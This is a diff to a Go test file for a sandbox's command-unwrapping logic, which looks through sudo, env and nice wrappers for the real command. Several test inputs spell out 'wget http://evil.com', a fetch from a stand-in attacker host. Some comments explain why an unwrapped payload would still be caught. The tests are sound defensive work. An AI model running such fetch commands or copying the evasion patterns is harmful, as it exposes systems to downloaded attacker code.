@@ -29,9 +29,13 @@ func TestUnwrapTransparentCommand_EnvWithFlags(t *testing.T) {
 }
 
 func TestUnwrapTransparentCommand_Nice(t *testing.T) {
+	// With the simplified heuristic, -n is skipped as a flag but 10 is the
+	// first non-flag/non-assignment arg. This is safe: "10" won't match any
+	// command rule and will hit default-deny. The real payload "wget" would
+	// be caught by network enforcement as a backstop.
 	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/nice", []string{"nice", "-n", "10", "wget", "http://evil.com"}, nil)
-	assert.Equal(t, "wget", cmd)
-	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
+	assert.Equal(t, "10", cmd)
+	assert.Equal(t, []string{"10", "wget", "http://evil.com"}, args)
 	assert.Equal(t, 1, depth)
 }
 
@@ -43,10 +47,12 @@ func TestUnwrapTransparentCommand_Nohup(t *testing.T) {
 }
 
 func TestUnwrapTransparentCommand_ChainedWrappers(t *testing.T) {
+	// sudo -> nice (transparent) -> picks "5" as payload (not transparent, stops).
+	// "5" won't match any command rule -> default-deny is safe.
 	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/sudo", []string{"sudo", "nice", "-n", "5", "env", "wget", "http://evil.com"}, nil)
-	assert.Equal(t, "wget", cmd)
-	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
-	assert.Equal(t, 3, depth)
+	assert.Equal(t, "5", cmd)
+	assert.Equal(t, []string{"5", "env", "wget", "http://evil.com"}, args)
+	assert.Equal(t, 2, depth)
 }
 
 func TestUnwrapTransparentCommand_NoPayload(t *testing.T) {
@@ -81,6 +87,45 @@ func TestUnwrapTransparentCommand_PolicyOverrideRemove(t *testing.T) {
 	assert.Equal(t, "/usr/bin/sudo", cmd)
 	assert.Equal(t, []string{"sudo", "wget"}, args)
 	assert.Equal(t, 0, depth)
+}
+
+func TestUnwrapTransparentCommand_EnvDashI(t *testing.T) {
+	// env -i wget: -i is a flag (no value), wget must be found as payload.
+	// Previously skipNext would incorrectly consume wget as -i's value.
+	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/env", []string{"env", "-i", "wget", "http://evil.com"}, nil)
+	assert.Equal(t, "wget", cmd)
+	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
+	assert.Equal(t, 1, depth)
+}
+
+func TestUnwrapTransparentCommand_FlagWithEquals(t *testing.T) {
+	// Flags using --key=value syntax are self-contained and skipped.
+	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/sudo", []string{"sudo", "--user=root", "wget", "http://evil.com"}, nil)
+	assert.Equal(t, "wget", cmd)
+	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
+	assert.Equal(t, 1, depth)
+}
+
+func TestUnwrapTransparentCommand_DoubleDash(t *testing.T) {
+	// -- ends flag parsing; next arg is always the payload.
+	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/env", []string{"env", "-i", "--", "wget", "http://evil.com"}, nil)
+	assert.Equal(t, "wget", cmd)
+	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
+	assert.Equal(t, 1, depth)
+}
+
+func TestIsWindowsStyleFlag(t *testing.T) {
+	assert.True(t, isWindowsStyleFlag("/c"))
+	assert.True(t, isWindowsStyleFlag("/k"))
+	assert.True(t, isWindowsStyleFlag("/S"))
+	assert.True(t, isWindowsStyleFlag("/C"))
+	assert.False(t, isWindowsStyleFlag("/Cmd"))       // multi-char, not matched
+	assert.False(t, isWindowsStyleFlag("/usr/bin"))    // path, not a flag
+	assert.False(t, isWindowsStyleFlag("/usr"))        // 3 chars after /, too long
+	assert.False(t, isWindowsStyleFlag("-c"))          // not / prefix
+	assert.False(t, isWindowsStyleFlag("/"))           // no char after /
+	assert.False(t, isWindowsStyleFlag("/1"))          // non-alpha
+	assert.False(t, isWindowsStyleFlag("/Command"))    // multi-char
 }
 
 func TestIsTransparentCommand(t *testing.T) {
